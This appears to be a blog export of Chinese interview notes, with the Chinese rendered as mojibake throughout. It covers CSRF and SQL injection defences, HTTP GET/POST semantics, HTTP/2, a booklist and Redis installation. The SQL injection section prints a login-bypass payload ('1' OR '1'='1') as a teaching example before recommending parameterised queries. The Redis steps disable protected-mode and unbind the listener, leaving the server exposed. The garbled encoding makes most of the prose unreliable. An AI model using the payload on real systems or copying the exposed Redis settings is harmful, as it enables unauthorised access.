åœ¨è®¿é—®æ•æ„Ÿæ•°æ®è¯·æ±‚æ—¶ï¼Œè¦æ±‚ç”¨æˆ·æµè§ˆå™¨æä¾›ä¸ä¿å­˜åœ¨ Cookie ä¸­ï¼Œå¹¶ä¸”æ”»å‡»è€…æ— æ³•ä¼ªé€ çš„æ•°æ®ä½œä¸ºæ ¡éªŒã€‚ä¾‹å¦‚æœåŠ¡å™¨ç”Ÿæˆéšæœºæ•°å¹¶é™„åŠ åœ¨è¡¨å•ä¸­ï¼Œå¹¶è¦æ±‚å®¢æˆ·ç«¯ä¼ å›è¿™ä¸ªéšæœºæ•°ã€‚ ï¼ˆä¸‰ï¼‰è¾“å…¥éªŒè¯ç  å› ä¸º CSRF æ”»å‡»æ˜¯åœ¨ç”¨æˆ·æ— æ„è¯†çš„æƒ…å†µä¸‹å‘ç”Ÿçš„ï¼Œæ‰€ä»¥è¦æ±‚ç”¨æˆ·è¾“å…¥éªŒè¯ç å¯ä»¥è®©ç”¨æˆ·çŸ¥é“è‡ªå·±æ­£åœ¨åšçš„æ“ä½œã€‚ ä¹Ÿå¯ä»¥è¦æ±‚ç”¨æˆ·è¾“å…¥éªŒè¯ç æ¥è¿›è¡Œæ ¡éªŒã€‚ SQL æ³¨å…¥æ”»å‡»1. æ¦‚å¿µæœåŠ¡å™¨ä¸Šçš„æ•°æ®åº“è¿è¡Œéæ³•çš„ SQL è¯­å¥ï¼Œä¸»è¦é€šè¿‡æ‹¼æ¥æ¥å®Œæˆã€‚ 2. æ”»å‡»åŸç†ä¾‹å¦‚ä¸€ä¸ªç½‘ç«™ç™»å½•éªŒè¯çš„ SQL æŸ¥è¯¢ä»£ç ä¸ºï¼š 1strSQL = "SELECT * FROM users WHERE (name = '" + userName + "') and (pw = '"+ passWord +"');" å¦‚æœå¡«å…¥ä»¥ä¸‹å†…å®¹ï¼š 12userName = "1' OR '1'='1";passWord = "1' OR '1'='1"; é‚£ä¹ˆ SQL æŸ¥è¯¢å­—ç¬¦ä¸²ä¸ºï¼š 1strSQL = "SELECT * FROM users WHERE (name = '1' OR '1'='1') and (pw = '1' OR '1'='1');" æ­¤æ—¶æ— éœ€éªŒè¯é€šè¿‡å°±èƒ½æ‰§è¡Œä»¥ä¸‹æŸ¥è¯¢ï¼š 1strSQL = "SELECT * FROM users;" 3. é˜²èŒƒæ‰‹æ®µï¼ˆä¸€ï¼‰ä½¿ç”¨å‚æ•°åŒ–æŸ¥è¯¢ ä»¥ä¸‹ä»¥ Java ä¸­çš„ PreparedStatement ä¸ºä¾‹ï¼Œå®ƒæ˜¯é¢„å…ˆç¼–è¯‘çš„ SQL è¯­å¥ï¼Œå¯ä»¥ä¼ å…¥é€‚å½“å‚æ•°å¹¶ä¸”å¤šæ¬¡æ‰§è¡Œã€‚ç”±äºæ²¡æœ‰æ‹¼æ¥çš„è¿‡ç¨‹ï¼Œå› æ­¤å¯ä»¥é˜²æ­¢ SQL æ³¨å…¥çš„å‘ç”Ÿã€‚ 1234PreparedStatement stmt = connection.prepareStatement("SELECT * FROM users WHERE userid=? AND password=?");stmt.setString(1, userid);stmt.setString(2, password);ResultSet rs = stmt.executeQuery(); ï¼ˆäºŒï¼‰å•å¼•å·è½¬æ¢ å°†ä¼ å…¥çš„å‚æ•°ä¸­çš„å•å¼•å·è½¬æ¢ä¸ºè¿ç»­ä¸¤ä¸ªå•å¼•å·ï¼ŒPHP ä¸­çš„ Magic quote å¯ä»¥å®Œæˆè¿™ä¸ªåŠŸèƒ½ã€‚ æ‹’ç»æœåŠ¡æ”»å‡»æ‹’ç»æœåŠ¡æ”»å‡»ï¼ˆdenial-of-service attackï¼ŒDoSï¼‰ï¼Œäº¦ç§°æ´ªæ°´æ”»å‡»ï¼Œå…¶ç›®çš„åœ¨äºä½¿ç›®æ ‡ç”µè„‘çš„ç½‘ç»œæˆ–ç³»ç»Ÿèµ„æºè€—å°½ï¼Œä½¿æœåŠ¡æš‚æ—¶ä¸­æ–­æˆ–åœæ­¢ï¼Œå¯¼è‡´å…¶æ­£å¸¸ç”¨æˆ·æ— æ³•è®¿é—®ã€‚ åˆ†å¸ƒå¼æ‹’ç»æœåŠ¡æ”»å‡»ï¼ˆdistributed denial-of-service attackï¼ŒDDoSï¼‰ï¼ŒæŒ‡æ”»å‡»è€…ä½¿ç”¨ç½‘ç»œä¸Šä¸¤ä¸ªæˆ–ä»¥ä¸Šè¢«æ”»é™·çš„ç”µè„‘ä½œä¸ºâ€œåƒµå°¸â€å‘ç‰¹å®šçš„ç›®æ ‡å‘åŠ¨â€œæ‹’ç»æœåŠ¡â€å¼æ”»å‡»ã€‚ ç»´åŸºç™¾ç§‘ï¼šæ‹’ç»æœåŠ¡æ”»å‡» å…«ã€GET å’Œ POST çš„åŒºåˆ«ä½œç”¨GET ç”¨äºè·å–èµ„æºï¼Œè€Œ POST ç”¨äºä¼ è¾“å®ä½“ä¸»ä½“ã€‚ å‚æ•°GET å’Œ POST çš„è¯·æ±‚éƒ½èƒ½ä½¿ç”¨é¢å¤–çš„å‚æ•°ï¼Œä½†æ˜¯ GET çš„å‚æ•°æ˜¯ä»¥æŸ¥è¯¢å­—ç¬¦ä¸²å‡ºç°åœ¨ URL ä¸­ï¼Œè€Œ POST çš„å‚æ•°å­˜å‚¨åœ¨å®ä½“ä¸»ä½“ä¸­ã€‚ 1GET /test/demo_form.asp?name1=value1&amp;name2=value2 HTTP/1.1 123POST /test/demo_form.asp HTTP/1.1Host: w3schools.comname1=value1&amp;name2=value2 ä¸èƒ½å› ä¸º POST å‚æ•°å­˜å‚¨åœ¨å®ä½“ä¸»ä½“ä¸­å°±è®¤ä¸ºå®ƒçš„å®‰å…¨æ€§æ›´é«˜ï¼Œå› ä¸ºç…§æ ·å¯ä»¥é€šè¿‡ä¸€äº›æŠ“åŒ…å·¥å…·ï¼ˆFiddlerï¼‰æŸ¥çœ‹ã€‚ å› ä¸º URL åªæ”¯æŒ ASCII ç ï¼Œå› æ­¤ GET çš„å‚æ•°ä¸­å¦‚æœå­˜åœ¨ä¸­æ–‡ç­‰å­—ç¬¦å°±éœ€è¦å…ˆè¿›è¡Œç¼–ç ï¼Œä¾‹å¦‚ä¸­æ–‡ä¼šè½¬æ¢ä¸º%E4%B8%AD%E6%96%87ï¼Œè€Œç©ºæ ¼ä¼šè½¬æ¢ä¸º%20ã€‚POST æ”¯æŒæ ‡å‡†å­—ç¬¦é›†ã€‚ å®‰å…¨å®‰å…¨çš„ HTTP æ–¹æ³•ä¸ä¼šæ”¹å˜æœåŠ¡å™¨çŠ¶æ€ï¼Œä¹Ÿå°±æ˜¯è¯´å®ƒåªæ˜¯å¯è¯»çš„ã€‚ GET æ–¹æ³•æ˜¯å®‰å…¨çš„ï¼Œè€Œ POST å´ä¸æ˜¯ï¼Œå› ä¸º POST çš„ç›®çš„æ˜¯ä¼ é€å®ä½“ä¸»ä½“å†…å®¹ï¼Œè¿™ä¸ªå†…å®¹å¯èƒ½æ˜¯ç”¨æˆ·ä¸Šä¼ çš„è¡¨å•æ•°æ®ï¼Œä¸Šä¼ æˆåŠŸä¹‹åï¼ŒæœåŠ¡å™¨å¯èƒ½æŠŠè¿™ä¸ªæ•°æ®å­˜å‚¨åˆ°æ•°æ®åº“ä¸­ï¼Œå› æ­¤çŠ¶æ€ä¹Ÿå°±å‘ç”Ÿäº†æ”¹å˜ã€‚ å®‰å…¨çš„æ–¹æ³•é™¤äº† GET ä¹‹å¤–è¿˜æœ‰ï¼šHEADã€OPTIONSã€‚ ä¸å®‰å…¨çš„æ–¹æ³•é™¤äº† POST ä¹‹å¤–è¿˜æœ‰ PUTã€DELETEã€‚ å¹‚ç­‰æ€§å¹‚ç­‰çš„ HTTP æ–¹æ³•ï¼ŒåŒæ ·çš„è¯·æ±‚è¢«æ‰§è¡Œä¸€æ¬¡ä¸è¿ç»­æ‰§è¡Œå¤šæ¬¡çš„æ•ˆæœæ˜¯ä¸€æ ·çš„ï¼ŒæœåŠ¡å™¨çš„çŠ¶æ€ä¹Ÿæ˜¯ä¸€æ ·çš„ã€‚æ¢å¥è¯è¯´å°±æ˜¯ï¼Œå¹‚ç­‰æ–¹æ³•ä¸åº”è¯¥å…·æœ‰å‰¯ä½œç”¨ï¼ˆç»Ÿè®¡ç”¨é€”é™¤å¤–ï¼‰ã€‚åœ¨æ­£ç¡®å®ç°çš„æ¡ä»¶ä¸‹ï¼ŒGETï¼ŒHEADï¼ŒPUT å’Œ DELETE ç­‰æ–¹æ³•éƒ½æ˜¯å¹‚ç­‰çš„ï¼Œè€Œ POST æ–¹æ³•ä¸æ˜¯ã€‚æ‰€æœ‰çš„å®‰å…¨æ–¹æ³•ä¹Ÿéƒ½æ˜¯å¹‚ç­‰çš„ã€‚ GET /pageX HTTP/1.1 æ˜¯å¹‚ç­‰çš„ã€‚è¿ç»­è°ƒç”¨å¤šæ¬¡ï¼Œå®¢æˆ·ç«¯æ¥æ”¶åˆ°çš„ç»“æœéƒ½æ˜¯ä¸€æ ·çš„ï¼š 1234GET /pageX HTTP/1.1GET /pageX HTTP/1.1GET /pageX HTTP/1.1GET /pageX HTTP/1.1 POST /add_row HTTP/1.1 ä¸æ˜¯å¹‚ç­‰çš„ã€‚å¦‚æœè°ƒç”¨å¤šæ¬¡ï¼Œå°±ä¼šå¢åŠ å¤šè¡Œè®°å½•ï¼š 123POST /add_row HTTP/1.1 -&gt; Adds a 1nd rowPOST /add_row HTTP/1.1 -&gt; Adds a 2nd rowPOST /add_row HTTP/1.1 -&gt; Adds a 3rd row DELETE /idX/delete HTTP/1.1 æ˜¯å¹‚ç­‰çš„ï¼Œå³ä¾¿ä¸åŒçš„è¯·æ±‚æ¥æ”¶åˆ°çš„çŠ¶æ€ç ä¸ä¸€æ ·ï¼š 123DELETE /idX/delete HTTP/1.1 -&gt; Returns 200 if idX existsDELETE /idX/delete HTTP/1.1 -&gt; Returns 404 as it just got deletedDELETE /idX/delete HTTP/1.1 -&gt; Returns 404 å¯ç¼“å­˜å¦‚æœè¦å¯¹å“åº”è¿›è¡Œç¼“å­˜ï¼Œéœ€è¦æ»¡è¶³ä»¥ä¸‹æ¡ä»¶ï¼š è¯·æ±‚æŠ¥æ–‡çš„ HTTP æ–¹æ³•æœ¬èº«æ˜¯å¯ç¼“å­˜çš„ï¼ŒåŒ…æ‹¬ GET å’Œ HEADï¼Œä½†æ˜¯ PUT å’Œ DELETE ä¸å¯ç¼“å­˜ï¼ŒPOST åœ¨å¤šæ•°æƒ…å†µä¸‹ä¸å¯ç¼“å­˜çš„ã€‚ å“åº”æŠ¥æ–‡çš„çŠ¶æ€ç æ˜¯å¯ç¼“å­˜çš„ï¼ŒåŒ…æ‹¬ï¼š200, 203, 204, 206, 300, 301, 404, 405, 410, 414, and 501ã€‚ å“åº”æŠ¥æ–‡çš„ Cache-Control é¦–éƒ¨å­—æ®µæ²¡æœ‰æŒ‡å®šä¸è¿›è¡Œç¼“å­˜ã€‚ XMLHttpRequestä¸ºäº†é˜è¿° POST å’Œ GET çš„å¦ä¸€ä¸ªåŒºåˆ«ï¼Œéœ€è¦å…ˆäº†è§£ XMLHttpRequestï¼š XMLHttpRequest æ˜¯ä¸€ä¸ª APIï¼Œå®ƒä¸ºå®¢æˆ·ç«¯æä¾›äº†åœ¨å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ä¹‹é—´ä¼ è¾“æ•°æ®çš„åŠŸèƒ½ã€‚å®ƒæä¾›äº†ä¸€ä¸ªé€šè¿‡ URL æ¥è·å–æ•°æ®çš„ç®€å•æ–¹å¼ï¼Œå¹¶ä¸”ä¸ä¼šä½¿æ•´ä¸ªé¡µé¢åˆ·æ–°ã€‚è¿™ä½¿å¾—ç½‘é¡µåªæ›´æ–°ä¸€éƒ¨åˆ†é¡µé¢è€Œä¸ä¼šæ‰“æ‰°åˆ°ç”¨æˆ·ã€‚XMLHttpRequest åœ¨ AJAX ä¸­è¢«å¤§é‡ä½¿ç”¨ã€‚ åœ¨ä½¿ç”¨ XMLHttpRequest çš„ POST æ–¹æ³•æ—¶ï¼Œæµè§ˆå™¨ä¼šå…ˆå‘é€ Header å†å‘é€ Dataã€‚ä½†å¹¶ä¸æ˜¯æ‰€æœ‰æµè§ˆå™¨ä¼šè¿™ä¹ˆåšï¼Œä¾‹å¦‚ç«ç‹å°±ä¸ä¼šã€‚è€Œ GET æ–¹æ³• Header å’Œ Data ä¼šä¸€èµ·å‘é€ã€‚ ä¹ã€HTTP/1.0 ä¸ HTTP/1.1 çš„åŒºåˆ« è¯¦ç»†å†…å®¹è¯·è§ä¸Šæ–‡ HTTP/1.1 é»˜è®¤æ˜¯é•¿è¿æ¥ HTTP/1.1 æ”¯æŒç®¡çº¿åŒ–å¤„ç† HTTP/1.1 æ”¯æŒåŒæ—¶æ‰“å¼€å¤šä¸ª TCP è¿æ¥ HTTP/1.1 æ”¯æŒè™šæ‹Ÿä¸»æœº HTTP/1.1 æ–°å¢çŠ¶æ€ç  100 HTTP/1.1 æ”¯æŒåˆ†å—ä¼ è¾“ç¼–ç  HTTP/1.1 æ–°å¢ç¼“å­˜å¤„ç†æŒ‡ä»¤ max-age åã€HTTP/2.0HTTP/1.x ç¼ºé™· HTTP/1.x å®ç°ç®€å•æ˜¯ä»¥ç‰ºç‰²åº”ç”¨æ€§èƒ½ä¸ºä»£ä»·çš„ï¼š å®¢æˆ·ç«¯éœ€è¦ä½¿ç”¨å¤šä¸ªè¿æ¥æ‰èƒ½å®ç°å¹¶å‘å’Œç¼©çŸ­å»¶è¿Ÿï¼› ä¸ä¼šå‹ç¼©è¯·æ±‚å’Œå“åº”é¦–éƒ¨ï¼Œä»è€Œå¯¼è‡´ä¸å¿…è¦çš„ç½‘ç»œæµé‡ï¼› ä¸æ”¯æŒæœ‰æ•ˆçš„èµ„æºä¼˜å…ˆçº§ï¼Œè‡´ä½¿åº•å±‚ TCP è¿æ¥çš„åˆ©ç”¨ç‡ä½ä¸‹ã€‚ äºŒè¿›åˆ¶åˆ†å¸§å±‚HTTP/2.0 å°†æŠ¥æ–‡åˆ†æˆ HEADERS å¸§å’Œ DATA å¸§ï¼Œå®ƒä»¬éƒ½æ˜¯äºŒè¿›åˆ¶æ ¼å¼çš„ã€‚ åœ¨é€šä¿¡è¿‡ç¨‹ä¸­ï¼Œåªä¼šæœ‰ä¸€ä¸ª TCP è¿æ¥å­˜åœ¨ï¼Œå®ƒæ‰¿è½½äº†ä»»æ„æ•°é‡çš„åŒå‘æ•°æ®æµï¼ˆStreamï¼‰ã€‚ä¸€ä¸ªæ•°æ®æµéƒ½æœ‰ä¸€ä¸ªå”¯ä¸€æ ‡è¯†ç¬¦å’Œå¯é€‰çš„ä¼˜å…ˆçº§ä¿¡æ¯ï¼Œç”¨äºæ‰¿è½½åŒå‘ä¿¡æ¯ã€‚æ¶ˆæ¯ï¼ˆMessageï¼‰æ˜¯ä¸é€»è¾‘è¯·æ±‚æˆ–å“åº”æ¶ˆæ¯å¯¹åº”çš„å®Œæ•´çš„ä¸€ç³»åˆ—å¸§ã€‚å¸§ï¼ˆFramï¼‰æ˜¯æœ€å°çš„é€šä¿¡å•ä½ï¼Œæ¥è‡ªä¸åŒæ•°æ®æµçš„å¸§å¯ä»¥äº¤é”™å‘é€ï¼Œç„¶åå†æ ¹æ®æ¯ä¸ªå¸§å¤´çš„æ•°æ®æµæ ‡è¯†ç¬¦é‡æ–°ç»„è£…ã€‚ æœåŠ¡ç«¯æ¨é€HTTP/2.0 åœ¨å®¢æˆ·ç«¯è¯·æ±‚ä¸€ä¸ªèµ„æºæ—¶ï¼Œä¼šæŠŠç›¸å…³çš„èµ„æºä¸€èµ·å‘é€ç»™å®¢æˆ·ç«¯ï¼Œå®¢æˆ·ç«¯å°±ä¸éœ€è¦å†æ¬¡å‘èµ·è¯·æ±‚äº†ã€‚ä¾‹å¦‚å®¢æˆ·ç«¯è¯·æ±‚ page.html é¡µé¢ï¼ŒæœåŠ¡ç«¯å°±æŠŠ script.js å’Œ style.css ç­‰ä¸ä¹‹ç›¸å…³çš„èµ„æºä¸€èµ·å‘ç»™å®¢æˆ·ç«¯ã€‚ é¦–éƒ¨å‹ç¼©HTTP/1.1 çš„é¦–éƒ¨å¸¦æœ‰å¤§é‡ä¿¡æ¯ï¼Œè€Œä¸”æ¯æ¬¡éƒ½è¦é‡å¤å‘é€ã€‚HTTP/2.0 è¦æ±‚å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨åŒæ—¶ç»´æŠ¤å’Œæ›´æ–°ä¸€ä¸ªåŒ…å«ä¹‹å‰è§è¿‡çš„é¦–éƒ¨å­—æ®µè¡¨ï¼Œä»è€Œé¿å…äº†é‡å¤ä¼ è¾“ã€‚ä¸ä»…å¦‚æ­¤ï¼ŒHTTP/2.0 ä¹Ÿä½¿ç”¨ Huffman ç¼–ç å¯¹é¦–éƒ¨å­—æ®µè¿›è¡Œå‹ç¼©ã€‚ å‚è€ƒèµ„æ–™ ä¸Šé‡å®£. å›¾è§£ HTTP[M]. äººæ°‘é‚®ç”µå‡ºç‰ˆç¤¾, 2014. MDN : HTTP HTTP/2 ç®€ä»‹ htmlspecialchars How to Fix SQL Injection Using Java PreparedStatement &amp; CallableStatement æµ…è°ˆ HTTP ä¸­ Get ä¸ Post çš„åŒºåˆ« Are http:// and www really necessary? HTTP (HyperText Transfer Protocol) Web-VPN: Secure Proxies with SPDY &amp; Chrome File:HTTP persistent connection.svg Proxy server What Is This HTTPS/SSL Thing And Why Should You Care? What is SSL Offloading? Sun Directory Server Enterprise Edition 7.0 Reference - Key Encryption An Introduction to Mutual SSL Authentication The Difference Between URLs and URIs Cookie ä¸ Session çš„åŒºåˆ« COOKIE å’Œ SESSION æœ‰ä»€ä¹ˆåŒºåˆ« Cookie/Session çš„æœºåˆ¶ä¸å®‰å…¨ HTTPS è¯ä¹¦åŸç† ç»´åŸºç™¾ç§‘ï¼šè·¨ç«™è„šæœ¬ ç»´åŸºç™¾ç§‘ï¼šSQL æ³¨å…¥æ”»å‡» ç»´åŸºç™¾ç§‘ï¼šè·¨ç«™ç‚¹è¯·æ±‚ä¼ªé€  ç»´åŸºç™¾ç§‘ï¼šæ‹’ç»æœåŠ¡æ”»å‡» What is the difference between a URI, a URL and a URN? XMLHttpRequest XMLHttpRequest (XHR) Uses Multiple Packets for HTTP POST? Symmetric vs. Asymmetric Encryption â€“ What are differences? Web æ€§èƒ½ä¼˜åŒ–ä¸ HTTP/2 HTTP/2 ç®€ä»‹]]></content>
      <categories>
        <category>Github</category>
        <category>Interview-Notebook</category>
      </categories>
      <tags>
        <tag>æŠ€æœ¯</tag>
        <tag>Java</tag>
        <tag>è½¬è½½</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[BOOKLIST]]></title>
    <url>%2F2018%2F07%2F04%2FJava%2FInterview%2FInterview-Notebook%2FBOOKLIST%2F</url>
    <content type="text"><![CDATA[æ•°æ®ç»“æ„ä¸ç®—æ³• ç®—æ³• æ•°æ®ç»“æ„ä¸ç®—æ³•åˆ†æ ç¼–ç¨‹ç ç‘ å‰‘æŒ‡ Offer æ“ä½œç³»ç»Ÿ ç°ä»£æ“ä½œç³»ç»Ÿ æ·±å…¥ç†è§£è®¡ç®—æœºç³»ç»Ÿ é¸Ÿå“¥çš„ Linux ç§æˆ¿èœ Unix ç¯å¢ƒé«˜çº§ç¼–ç¨‹ Unix/Linux ç¼–ç¨‹å®è·µæ•™ç¨‹ è®¡ç®—æœºç½‘ç»œ è®¡ç®—æœºç½‘ç»œ è®¡ç®—æœºç½‘ç»œ è‡ªé¡¶å‘ä¸‹æ–¹æ³• å›¾è§£ HTTP TCP/IP è¯¦è§£ å· 1ï¼šåè®® UNIX ç½‘ç»œç¼–ç¨‹ Linux å¤šçº¿ç¨‹æœåŠ¡ç«¯ç¼–ç¨‹ é¢å‘å¯¹è±¡ Head First è®¾è®¡æ¨¡å¼ è®¾è®¡æ¨¡å¼ å¯å¤ç”¨é¢å‘å¯¹è±¡è½¯ä»¶çš„åŸºç¡€ æ•æ·è½¯ä»¶å¼€å‘ åŸåˆ™ã€æ¨¡å¼ä¸å®è·µ æ•°æ®åº“ æ•°æ®åº“ç³»ç»Ÿæ¦‚å¿µ MySQL å¿…çŸ¥å¿…ä¼š é«˜æ€§èƒ½ MySQL Redis è®¾è®¡ä¸å®ç° Redis å®æˆ˜ Java Java ç¼–ç¨‹æ€æƒ³ Effective java ä¸­æ–‡ç‰ˆ æ·±å…¥ç†è§£ Java è™šæ‹Ÿæœº Java å¹¶å‘ç¼–ç¨‹å®æˆ˜ ç²¾é€š Spring 4.x Spring æ­ç§˜ C++ C++ Primer Effective C++ C++ ç¼–ç¨‹è§„èŒƒ STL æºç å‰–æ æ·±åº¦æ¢ç´¢ C++ å¯¹è±¡æ¨¡å‹ ç½‘ç«™æ¶æ„/åˆ†å¸ƒå¼ å¤§è§„æ¨¡åˆ†å¸ƒå¼å­˜å‚¨ç³»ç»Ÿ ä» Paxos åˆ° Zookeeper å¤§å‹ç½‘ç«™ç³»ç»Ÿä¸ Java ä¸­é—´ä»¶å¼€å‘å®è·µ æ·˜å®æŠ€æœ¯è¿™åå¹´ æ·±å…¥ç†è§£ Nginx å¼€å‘å·¥å…· Pro Git æ­£åˆ™è¡¨è¾¾å¼å¿…çŸ¥å¿…ä¼š ç¼–ç å®è·µ é‡æ„ ä»£ç å¤§å…¨ äººæœˆç¥è¯ ç¨‹åºå‘˜çš„èŒä¸šç´ å…» ç¼–å†™å¯è¯»ä»£ç çš„è‰ºæœ¯ å…¶å®ƒ JavaScript è¯­è¨€ç²¾ç²¹ åˆ©ç”¨ Python è¿›è¡Œæ•°æ®åˆ†æ æ¦‚ç‡è®ºä¸æ•°ç†ç»Ÿè®¡]]></content>
      <categories>
        <category>Github</category>
        <category>Interview-Notebook</category>
      </categories>
      <tags>
        <tag>æŠ€æœ¯</tag>
        <tag>Java</tag>
        <tag>è½¬è½½</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Redis]]></title>
    <url>%2F2018%2F07%2F03%2FHadoop%2F8_Redis%2FRedis%2F</url>
    <content type="text"><![CDATA[1.å®‰è£…1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192931. ä¸‹è½½2. tar3. cd redis-3.xxxx/deps4. make geohash-int hiredis jemalloc linenoise lua-----------------5. cd .. é€€å›åˆ° redis æ ¹ç›®å½•$redis-3.xxxx&gt; make test ç­‰å¾…å‡ åˆ†é’Ÿ, ç­‰å¾…ç¼–è¯‘å®Œæˆä¼šå‡ºç° `ç¼–è¯‘å®Œæˆæ²¡æœ‰é”™è¯¯`çš„è‹±æ–‡... ç„¶åç›´æ¥ make 6. æ¥ä¸‹æ¥å°±æ˜¯æ‰§è¡Œ make install å®‰è£…äº†å¯åŠ¨ç­‰è„šæœ¬äº† é»˜è®¤ä¼šè‡ªåŠ¨å®‰è£…åˆ° /usr/local/binmake åé¢è·Ÿä¸Š PREFIX=path å¯ä»¥è‡ªå·±æŒ‡å®šå®‰è£…è·¯å¾„è¿™é‡Œå®‰è£…åˆ° ~/apps/ ä¸‹çš„ redis ç›®å½•ä¸­$&gt; sudo make PREFIX=/home/ap/apps/redis install7. # å¤åˆ¶é…ç½®æ–‡ä»¶åˆ°rediså®‰è£…ç›®å½•$redis-3.xxxx&gt; sudo cp redis.conf /home/ap/apps/redis&gt; vi redis.conf-------------------------# ä¿®æ”¹ redis-server åå°å¯åŠ¨(ä¹Ÿå¯ä»¥ä¸é…, ç”¨ nohupçš„æ–¹å¼åå°å¯åŠ¨)daemonize yes# ä¿®æ”¹ protected-mode ä¸º noprotected-mode no# æ³¨é‡Šæ‰ bind æœ¬æœºç«¯å£# bind 127.0.0.1 ::1# é…ç½®ç¯å¢ƒå˜é‡export REDIS_HOME=/home/ap/apps/redisexport PATH=$PATH:$REDIS_HOME/bin# æŠŠç¯å¢ƒå˜é‡ .zshrc å’Œ å­˜æœ‰ sh å‘½ä»¤çš„ redis å®‰è£…ç›®å½•å‘é€åˆ°å…¶å®ƒæœºå™¨# source è¦ä½¿ç”¨æœºå™¨çš„ .zshrcé…ç½®8. ï£¿ï£¿ï£¿ï£¿ å¯åŠ¨è¯•è¯•çœ‹~# å¦‚æœé…ç½®äº†åå°å¯åŠ¨, å¹¶ä¸”åŠ è½½äº†é…ç½®æ–‡ä»¶çš„è¯å°±ä¸ä¼šå‡ºç°ä»¥ä¸‹å›¾å½¢äº† $&gt; redis-server ~/apps/redis/redis.conf ä¹Ÿå¯ä»¥ç›´æ¥ $&gt; redis-server è¿™æ ·å°±ä¸ä¼šåŠ è½½é…ç½®æ–‡ä»¶, ä¼šå‡ºç°ä¸‹é¢çš„.. _._ _.-``__ ''-._ _.-`` `. `_. ''-._ Redis 4.0.10 (00000000/0) 64 bit .-`` .-```. ```\/ _.,_ ''-._ ( ' , .-` | `, ) Running in standalone mode |`-._`-...-` __...-.``-._|'` _.-'| Port: 6379 | `-._ `._ / _.-' | PID: 1034 `-._ `-._ `-./ _.-' _.-' |`-._`-._ `-.__.-' _.-'_.-'| | `-._`-._ _.-'_.-' | http://redis.io `-._ `-._`-.__.-'_.-' _.-' |`-._`-._ `-.__.-' _.-'_.-'| | `-._`-._ _.-'_.-' | `-._ `-._`-.__.-'_.-' _.-' `-._ `-.__.-' _.-' `-._ _.-' `-.__.-'å‡ºç°ä¸€ä¸ªè¿™ä¸ªåŠçš„å›¾åƒ, å°±è¯´æ˜å¯åŠ¨æˆåŠŸäº†.....# ä¹Ÿå¯ä»¥è¿™æ ·åå°å¯åŠ¨, å¸¦ lognohup &lt;sub&gt;/apps/redis/bin/redis-server &lt;/sub&gt;/apps/redis/redis.conf 1&gt;&lt;sub&gt;/logs/redis_log/redis_std.log 2&gt;&lt;/sub&gt;/logs/redis_log/redis_error.log &amp;7ã€å¯åŠ¨å®¢æˆ·ç«¯ï¼Œæ‰§è¡Œå‘½ä»¤ï¼š[hadoop@hadoop02 ~]$ redis-cli# ï£¿ï£¿ï£¿ï£¿ æŸ¥çœ‹æ˜¯å¦æœ‰è¿›ç¨‹ps -ef | grep redis --------[ap@cs1]~% ps -ef | grep redisap 36260 35955 0 14:11 pts/3 00:00:00 redis-server *:6379ap 36287 36267 0 14:11 pts/5 00:00:00 grep redis&gt;&gt; æœ€å¼€å§‹çš„ 36260 å°±æ˜¯ pid9. ï£¿ï£¿ï£¿ è¿æ¥# redis/bin/redis-cli [-h localhost -p 6379 ]# å¦‚æœæ˜¯æœ¬æœºå¯åŠ¨å®¢æˆ·ç«¯$&gt; redis-cli# å¦‚æœæ˜¯ä»å…¶ä»–èŠ‚ç‚¹ä¸Šé“¾æ¥ redisï¼Œé‚£ä¹ˆå¯ä»¥è¿™ä¹ˆåšï¼š$cs2&gt; redis-cli -h cs1 -p 6379cs1:6379&gt; pingPONG10. åœæ­¢æœåŠ¡cliç«¯: shutdown save|nosave 2.Redis æ³¨æ„ç‚¹REmote DIctionary Server(Redis)Redis å¸¸è¢«ç§°ä½œæ˜¯ä¸€æ¬¾ key-value å†… å­˜å­˜å‚¨ç³»ç»Ÿæˆ–è€…å†…å­˜æ•°æ®åº“ï¼ŒåŒæ—¶ç”±äºå®ƒæ”¯æŒä¸°å¯Œçš„æ•°æ®ç»“æ„ï¼Œåˆè¢«ç§°ä¸ºä¸€ç§æ•°æ®ç»“æ„æœåŠ¡ å™¨ï¼ˆData Structure Serverï¼‰ã€‚ å› ä¸ºå€¼ï¼ˆvalueï¼‰å¯ä»¥æ˜¯å­—ç¬¦ä¸²(String)ï¼Œå“ˆå¸Œ(Map)ï¼Œåˆ—è¡¨(list)ï¼Œ é›†åˆ(sets)å’Œæœ‰åºé›†åˆ(sorted sets)ç­‰ç±»å‹ã€‚ ä¸å…¶ä»– key-value ç¼“å­˜äº§å“æ¯”è¾ƒç‹¬æœ‰ç‰¹ç‚¹1ã€Redis æ”¯æŒæ•°æ®çš„æŒä¹…åŒ–ï¼Œå¯ä»¥å°†å†…å­˜ä¸­çš„æ•°æ®ä¿æŒåœ¨ç£ç›˜ä¸­ï¼Œé‡å¯çš„æ—¶å€™å¯ä»¥å†æ¬¡åŠ è½½ è¿›è¡Œä½¿ç”¨ã€‚ 2ã€Redis ä¸ä»…ä»…æ”¯æŒç®€å•çš„ key-value ç±»å‹çš„æ•°æ®ï¼ŒåŒæ—¶è¿˜æä¾› listï¼Œsetï¼Œzsetï¼Œhash ç­‰æ•°æ® ç»“æ„çš„å­˜å‚¨ã€‚ 3ã€Redis æ”¯æŒæ•°æ®çš„å¤‡ä»½ï¼Œå³ master-slave æ¨¡å¼çš„æ•°æ®å¤‡ä»½ã€‚ Redisä¼˜åŠ¿1ã€æ€§èƒ½æé«˜ï¼šRedis èƒ½è¯»çš„é€Ÿåº¦æ˜¯ 110000 æ¬¡/sï¼Œå†™çš„é€Ÿåº¦æ˜¯ 81000 æ¬¡/s ã€‚ 2ã€ä¸°å¯Œçš„æ•°æ®ç±»å‹ï¼šRedis æ”¯æŒäºŒè¿›åˆ¶æ¡ˆä¾‹çš„ String, List, Hash, Set åŠ Sorted Set æ•°æ®ç±»å‹æ“ ä½œã€‚ 3ã€åŸå­æ“ä½œï¼šRedis çš„æ‰€æœ‰æ“ä½œéƒ½æ˜¯åŸå­æ€§çš„ï¼ŒåŒæ—¶ Redis è¿˜æ”¯æŒå¯¹å‡ ä¸ªæ“ä½œå…¨å¹¶åçš„åŸå­ æ€§æ‰§è¡Œã€‚ 4ã€ä¸°å¯Œçš„ç‰¹æ€§ï¼šRedis è¿˜æ”¯æŒ Publish/Subscribeï¼Œé€šçŸ¥ key 